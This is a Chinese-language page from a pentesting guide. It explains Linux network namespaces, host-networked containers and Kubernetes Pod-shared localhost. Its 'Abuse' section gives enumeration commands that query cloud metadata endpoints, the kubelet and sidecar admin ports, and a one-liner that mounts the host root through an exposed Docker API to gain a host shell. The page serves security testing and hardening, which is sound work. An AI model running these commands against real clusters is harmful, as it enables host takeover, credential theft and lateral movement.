# 网络命名空间

{{#include ../../../../../banners/hacktricks-training.md}}

## 概述

网络命名空间隔离了与网络相关的资源，例如接口、IP 地址、路由表、ARP/neighbor 状态、防火墙规则、sockets、UNIX-domain abstract socket namespace，以及 `/proc/net` 等文件的内容。<sup>[[2]](#references)</sup> 这就是为什么 container 可以拥有看起来属于自己的 `eth0`、自己的本地路由和自己的 loopback device，同时又不拥有 host 的真实 network stack。

从安全角度来看，这一点很重要，因为 network isolation 远不只是 port binding。私有 network namespace 限制了 workload 可以直接观察或重新配置的内容。一旦该 namespace 与 host 共享，container 可能突然获得对 host listeners、host-local services、abstract AF_UNIX endpoints 以及原本不应向 application 暴露的 network control points 的可见性。

## 运行机制

新创建的 network namespace 在接口连接到其中之前，会从一个空或几乎为空的 network environment 开始。随后，container runtimes 会创建或连接 virtual interfaces、分配地址并配置路由，使 workload 获得预期的 connectivity。在基于 bridge 的部署中，这通常意味着 container 会看到一个连接到 host bridge、由 veth 支持的接口。在 Kubernetes 中，CNI plugins 负责处理 Pod networking 的等效配置。

这种架构说明了为什么 `--network=host` 或 `hostNetwork: true` 会带来如此巨大的变化。workload 不再获得一个预先准备好的私有 network stack，而是加入 host 的实际 network stack。

## 实验

你可以使用以下命令查看一个几乎为空的 network namespace：
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
你还可以使用以下方式比较普通容器和 host-networked 容器：
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
host-networked container 不再拥有自己隔离的 socket 和 interface 视图。即使还没有询问进程具有什么 capabilities，这一变化本身就已经十分重要。

## Runtime Usage

除非另行配置，Docker 和 Podman 通常会为每个 container 创建私有 network namespace。Kubernetes 通常会为每个 Pod 提供独立的 network namespace，该 namespace 由 Pod 内的各个 container 共享，但与 host 分离。这意味着 `127.0.0.1` 通常是 Pod-local，而不是 container-local：一个仅绑定到 localhost 的 listener 通常可被其 sidecar 和同一 Pod 内的其他 container 访问。Incus/LXC 系统同样提供基于 network namespace 的强隔离，且通常支持更多种类的虚拟网络配置。

其共同原则是：private networking 是默认的隔离边界，而 host networking 则是明确退出该边界的选择。

## Misconfigurations

最重要的 misconfiguration 就是直接共享 host network namespace。有时这样做是为了性能、低级监控或方便，但它会移除 container 可用的最清晰边界之一。Host-local listener 会以更直接的方式变得可访问，仅限 localhost 的服务可能因此暴露，而 `CAP_NET_ADMIN` 或 `CAP_NET_RAW` 等 capabilities 也会变得更加危险，因为它们所启用的操作现在会作用于 host 自身的网络环境。

另一个问题是，即使 network namespace 是私有的，也授予过多 network-related capabilities。私有 namespace 确实能提供帮助，但这并不意味着 raw socket 或高级网络控制就变得无害。

在 Kubernetes 中，`hostNetwork: true` 还会改变你对 Pod-level network segmentation 的信任程度。Kubernetes 文档指出，许多 network plugins 无法在 `podSelector` / `namespaceSelector` 匹配中正确区分 `hostNetwork` Pod 的流量，因此会将其视为普通的 node 流量。<sup>[[1]](#references)</sup> 从攻击者的角度看，这意味着遭到 compromise 的 `hostNetwork` workload 通常应被视为 node-level network foothold，而不是仍然受到与 overlay-network workload 相同 policy 假设约束的普通 Pod。

## Abuse

在隔离较弱的配置中，攻击者可能检查 host 上正在监听的服务，访问仅绑定到 loopback 的 management endpoints，并根据具体 capabilities 和环境 sniff 或干扰流量；如果存在 `CAP_NET_ADMIN`，还可能重新配置 routing 和 firewall 状态。在 cluster 中，这也可能使 lateral movement 和 control-plane reconnaissance 变得更加容易。

如果怀疑存在 host networking，首先确认可见的 interfaces 和 listeners 属于 host，而不是属于隔离的 container 网络：
```bash
ip addr
ip route
ss -lntup | head -n 50
```
仅限 Loopback 的服务通常是第一个有价值的发现：
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
抽象 UNIX sockets 是另一个容易被忽略的目标，因为它们受 network namespace 作用域限制，尽管它们看起来不像 TCP/UDP listeners，并且可能不会以 filesystem paths 的形式存在于 `/run` 下。因此，使用 host network 的 container 可能继承对仅限 host 的 control channels 的访问权限，即使这些 channel 从未被 bind-mount 到 container 中：
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
一个历史案例是 `containerd-shim` abstract-socket 暴露漏洞，但更广泛的经验比具体的 CVE 更重要：一旦 workload 加入 host network namespace，abstract AF_UNIX services 也会成为 attack surface 的一部分。<sup>[[3]](#references)</sup> 如果这些 sockets 看起来与 runtime 或 administrative 操作有关，请转向 [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md)。

如果存在 network capabilities，请测试 workload 是否能够检查或修改可见的 stack：
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
在现代内核中，主机网络加上 `CAP_NET_ADMIN` 可能还会通过简单的 `iptables` / `nftables` 修改暴露更多数据包路径。`tc` qdiscs 和 filters 同样按 namespace 隔离，因此在共享的主机 network namespace 中，它们会应用于容器能够看到的主机接口。如果还存在 `CAP_BPF`，则与网络相关的 eBPF programs（例如 TC 和 XDP loaders）也会变得重要：<sup>[[4]](#references)</sup>
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
这很重要，因为攻击者可能能够在 host interface 层面 mirror、redirect、shape 或 drop traffic，而不仅仅是重写 firewall rules。在 private network namespace 中，这些操作会被限制在 container view 内；而在 shared host namespace 中，它们则会影响 host。

在 cluster 或 cloud 环境中，host networking 也使得对 metadata 和 control-plane-adjacent services 进行快速 local recon 变得合理：
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
在 Kubernetes 中，请记住：在多容器 Pod 中攻陷**任意**容器，也能访问同级容器和 sidecar 打开的 localhost listeners，因为整个 Pod 共享同一个 network namespace。这一点对于 service-mesh、observability 和 helper 容器尤其重要，因为它们的 admin 或 debug interfaces 通常会被有意设置为仅限 Pod 内部访问，而不是面向整个集群：
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
将“绑定到 localhost”视为 **Pod-private**，而不是 **container-private**。Pod 中的一个 container 被攻陷后，这一假设就不再成立。

### 完整示例：Host Networking + Local Runtime / Kubelet Access

Host networking 不会自动提供 host root 权限，但它通常会暴露一些特意设置为仅允许从节点本身访问的服务。如果其中某个服务的保护较弱，host networking 就会成为直接的权限提升路径。

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
localhost 上的 Kubelet：
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
影响：

- 如果本地 runtime API 暴露且未得到适当保护，可能直接 compromise host
- 如果可访问 kubelet 或本地 agents，可能进行 cluster reconnaissance 或 lateral movement
- 与 `CAP_NET_ADMIN` 结合时，可能进行 traffic manipulation 或造成 denial of service

## 检查

这些检查旨在了解进程是否拥有私有 network stack、可见的 routes 和 listeners，以及在测试 capabilities 之前，当前 network view 是否已经呈现出类似 host 的特征。
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
这里值得注意的是：

- 如果 `/proc/self/ns/net` 和 `/proc/1/ns/net` 看起来已经与 host 类似，则该 container 可能正在共享 host network namespace，或共享其他非私有 namespace。
- 当 shell 已经位于某个命名或持久化 namespace 内，并且你想将其与 host 侧 `/run/netns` 中的对象进行关联时，`lsns -t net` 和 `ip netns identify` 非常有用。
- `ss -lntup` 尤其有价值，因为它可以显示仅监听 loopback 的服务以及本地管理端点。`ss -xap` 和 `/proc/net/unix` 则补充了 abstract socket 视图，可以发现普通文件系统 socket 搜索遗漏的内容。
- 如果存在 `CAP_NET_ADMIN`、`CAP_NET_RAW` 或 `CAP_BPF`，路由、interface 名称、firewall 上下文、`tc` 状态以及 eBPF attachments 会变得更加重要。
- 在 Kubernetes 中，来自 `hostNetwork` Pod 的 service-name resolution 失败，可能只是因为该 Pod 没有使用 `dnsPolicy: ClusterFirstWithHostNet`，而不代表该 service 不存在。
- 在 multi-container Pod 中，localhost listeners 属于整个 Pod network namespace，因此在假设某个仅监听 loopback 的端口无法从 compromised container 访问之前，应先检查 sidecars 和 sibling containers。

检查 container 时，始终要将 network namespace 与 capability set 一起评估。host networking 加上较强的 network capabilities，与 bridge networking 加上范围受限的 default capability set，其安全态势完全不同。

## 参考资料

- [1] [Kubernetes NetworkPolicy 和 `hostNetwork` 注意事项](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [2] [Linux `network_namespaces(7)` 和 abstract UNIX socket isolation](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [3] [containerd advisory：向 host-network containers 暴露 abstract Unix domain sockets](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [4] [network-related eBPF programs 的 eBPF token 和 capability requirements](https://docs.ebpf.io/linux/concepts/token/)

{{#include ../../../../../banners/hacktricks-training.md}}
